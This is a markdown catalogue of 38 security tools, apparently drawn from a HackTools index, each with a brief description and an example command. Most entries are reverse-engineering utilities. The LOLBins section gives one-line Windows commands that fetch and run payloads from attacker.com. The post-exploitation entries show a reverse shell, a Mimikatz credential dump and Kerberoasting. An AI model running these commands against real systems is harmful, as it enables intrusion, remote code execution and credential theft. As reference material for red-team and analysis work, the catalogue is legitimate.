# Reverse Engineering & Misc Tools
> Source: HackTools | Entries: 38 | Platform: cross_platform


## Index

- [AD Enumeration](#ad-enumeration)
- [AD Security Assessment](#ad-security-assessment)
- [Command and Control](#command-and-control)
- [Credential Access](#credential-access)
- [Dynamic Instrumentation](#dynamic-instrumentation)
- [iOS Security](#ios-security)
- [LOLBins](#lolbins)
- [Miscellaneous](#miscellaneous)
- [Post-Exploitation](#post-exploitation)
- [Reverse Engineering](#reverse-engineering)


### AD Enumeration

#### ADRecon
PowerShell script that performs comprehensive Active Directory enumeration and generates detailed Excel/CSV/HTML repo...
**Categories:** AD Enumeration, Security Auditing, Reporting, PowerShell, Compliance
```
powershell.exe -ExecutionPolicy Bypass .\ADRecon.ps1 -OutputType xlsx
```

#### LDAPDomainDump
Python tool that dumps Active Directory information via LDAP and generates human-readable HTML, JSON, and grep-friend...
**Categories:** AD Enumeration, LDAP Dumping, Reporting, Reconnaissance, Cross-Platform
```
ldapdomaindump -u 'corp\user' -p 'P@ss' dc01.corp.local -o /tmp/ldap_dump
```

### AD Security Assessment

#### PingCastle
Active Directory security assessment tool that generates health check reports with risk scores. Analyzes AD configura...
**Categories:** AD Security Assessment, Health Check, Compliance, Reporting, Vulnerability Detection
```
PingCastle.exe --healthcheck --server dc01.corp.local
```

### Command and Control

#### Covenant
C2 framework with integrated .NET compilation and task execution capabilities. Provides collaborative red team operat...
**Categories:** Command and Control, Miscellaneous
```
dotnet run --project Covenant/Covenant.csproj
```

### Credential Access

#### Rubeus
C# Kerberos attack toolkit for performing kerberoasting, AS-REP roasting, ticket forging, constrained/unconstrained d...
**Categories:** Credential Access, Miscellaneous
```
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

### Dynamic Instrumentation

#### Frida
Dynamic instrumentation toolkit that injects a JavaScript engine into target processes on Android, iOS, Windows, macO...
**Categories:** Dynamic Instrumentation, Mobile Security, Runtime Analysis, Reverse Engineering, SSL Pinning Bypass
```
frida -U -f com.target.app -l bypass_pinning.js --no-pause
```

### iOS Security

#### needle
iOS security testing framework that streamlines the assessment of iOS applications. Provides modular approach to bina...
**Categories:** iOS Security, Mobile Security, Application Assessment, Binary Analysis, Dynamic Analysis
```
python needle.py
```

### LOLBins

#### BitsAdmin abuse
Windows BITS administration tool abused for stealthy file downloads, persistent payload delivery, and execution throu...
**Categories:** LOLBins, Miscellaneous
```
bitsadmin /transfer myJob /download /priority high http://attacker.com/payload.exe C:\Temp\payload.exe
```

#### certutil abuse
Windows certificate utility abused as a LOLBin for downloading files, decoding payloads, encoding data for exfiltrati...
**Categories:** LOLBins, Miscellaneous
```
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
```

#### mshta abuse
Microsoft HTML Application host abused to execute malicious HTA files containing VBScript/JScript for initial access,...
**Categories:** LOLBins, Miscellaneous
```
mshta http://attacker.com/payload.hta
```

#### regsvr32 abuse
Windows COM registration utility abused for proxy execution of malicious DLLs and COM scriptlets. Squiblydoo attack t...
**Categories:** LOLBins, Miscellaneous
```
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

#### rundll32 abuse
Windows DLL execution utility abused for proxy execution of malicious DLLs, JavaScript, and COM objects. Trusted Micr...
**Categories:** LOLBins, Miscellaneous
```
rundll32.exe payload.dll,EntryPoint
```

#### wmic abuse
Windows Management Instrumentation Command-line abused for remote code execution, system reconnaissance, lateral move...
**Categories:** LOLBins, Miscellaneous
```
wmic /node:target.domain.com process call create "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

### Miscellaneous

#### CyberChef
Web-based data transformation tool used for decoding, decrypting, and analyzing encoded payloads, obfuscated scripts,...
**Categories:** Miscellaneous, Data Analysis
```
npx cyberchef-cli --recipe 'FromBase64' --input encoded_payload.txt
```

#### OffensivePipeline
Automated build system for offensive C# tools that compiles, obfuscates, and prepares red team tooling for deployment...
**Categories:** Miscellaneous, Build Tools
```
OffensivePipeline.exe list
```

### Post-Exploitation

#### GhostPack
Suite of offensive C# tools for Active Directory attacks, credential theft, and privilege escalation. Includes Rubeus...
**Categories:** Post-Exploitation, Credential Access, Miscellaneous
```
Rubeus.exe kerberoast /outfile:hashes.txt
```

#### Nishang
PowerShell offensive security framework with shells, backdoors, information gathering, and privilege escalation scrip...
**Categories:** Post-Exploitation, Miscellaneous
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444
```

#### PowerSharpPack
Collection of offensive C# tools wrapped for PowerShell execution via reflection, enabling in-memory execution of sha...
**Categories:** Post-Exploitation, Miscellaneous
```
Invoke-Rubeus -Command 'kerberoast'
```

#### PowerSploit
PowerShell post-exploitation framework providing modules for code execution, persistence, privilege escalation, exfil...
**Categories:** Post-Exploitation, Miscellaneous
```
Import-Module PowerSploit; Invoke-Mimikatz -DumpCreds
```

#### SharpCollection
Pre-compiled collection of offensive .NET assemblies ready for deployment in red team operations. Provides immediatel...
**Categories:** Post-Exploitation, Miscellaneous
```
Rubeus.exe kerberoast /nowrap
```

### Reverse Engineering

#### APKTool
Android APK reverse engineering tool that decodes resources to nearly original form and rebuilds them after modificat...
**Categories:** Reverse Engineering, Mobile Security, APK Analysis, Android Security, Decompilation
```
apktool d target.apk -o output_dir
```

#### Binary Ninja
Commercial reverse engineering platform with advanced intermediate language analysis used for vulnerability research,...
**Categories:** Reverse Engineering
```
binaryninja malware_sample.exe
```

#### Cutter
GUI frontend for rizin/radare2 reverse engineering framework, providing visual disassembly and decompilation for malw...
**Categories:** Reverse Engineering
```
Cutter malware_sample.exe
```

#### dex2jar
Conversion toolkit that transforms Android DEX (Dalvik Executable) bytecode into standard Java JAR files for analysis...
**Categories:** Reverse Engineering, Mobile Security, Decompilation, Android Security, Bytecode Analysis
```
d2j-dex2jar target.apk -o output.jar
```

#### DIE (Detect It Easy)
Packer and compiler detection tool used for triaging suspicious executables during malware analysis. Identifies obfus...
**Categories:** Reverse Engineering
```
die.exe malware_sample.exe
```

#### dnSpy
.NET assembly debugger and decompiler used to reverse engineer, modify, and debug .NET malware and applications. Enab...
**Categories:** Reverse Engineering
```
dnSpy.exe malware.exe
```

#### dotPeek
JetBrains .NET decompiler used for analyzing .NET malware assemblies and extracting source code from compiled binarie...
**Categories:** Reverse Engineering
```
dotPeek64.exe malware.dll
```

#### FLOSS
FLARE Obfuscated String Solver that automatically deobfuscates strings from malware samples. Extracts hidden C2 URLs,...
**Categories:** Reverse Engineering
```
floss malware_sample.exe
```

#### Ghidra
NSA-developed reverse engineering framework used for malware analysis, vulnerability research, and binary exploitatio...
**Categories:** Reverse Engineering
```
ghidraRun
```

#### Hopper
macOS/Linux disassembler and decompiler used for reverse engineering macOS malware, iOS applications, and binary anal...
**Categories:** Reverse Engineering
```
hopper -e malware.macho
```

#### IDA Pro
Industry-standard interactive disassembler and debugger used extensively in malware analysis, exploit development, an...
**Categories:** Reverse Engineering
```
ida64.exe malware_sample.exe
```

#### ILSpy
Open-source .NET assembly browser and decompiler used for inspecting .NET malware, extracting embedded configurations...
**Categories:** Reverse Engineering
```
ILSpy.exe malware.exe
```

#### jadx
DEX to Java decompiler that produces readable Java source code directly from Android APK/DEX files. Features both com...
**Categories:** Reverse Engineering, Mobile Security, Decompilation, Android Security, Source Code Recovery
```
jadx -d output_dir target.apk
```

#### PE-bear
Portable Executable viewer and editor used for inspecting PE structure during malware analysis and for modifying PE h...
**Categories:** Reverse Engineering
```
PE-bear.exe malware_sample.exe
```

#### PEStudio
Malware initial assessment tool that performs static analysis of PE files, identifying suspicious indicators, imports...
**Categories:** Reverse Engineering
```
pestudio.exe malware_sample.exe
```

#### Radare2/rizin
Command-line reverse engineering framework with powerful scripting capabilities used for binary analysis, exploit dev...
**Categories:** Reverse Engineering
```
r2 -A malware.exe
```

#### upx
Executable packer/unpacker heavily abused by malware authors to compress and obfuscate payloads, reducing file size a...
**Categories:** Reverse Engineering
```
upx -9 payload.exe
```

#### x64dbg
Open-source Windows debugger frequently used for malware unpacking, anti-analysis bypass, and runtime binary patching...
**Categories:** Reverse Engineering
```
x64dbg.exe malware_sample.exe
```
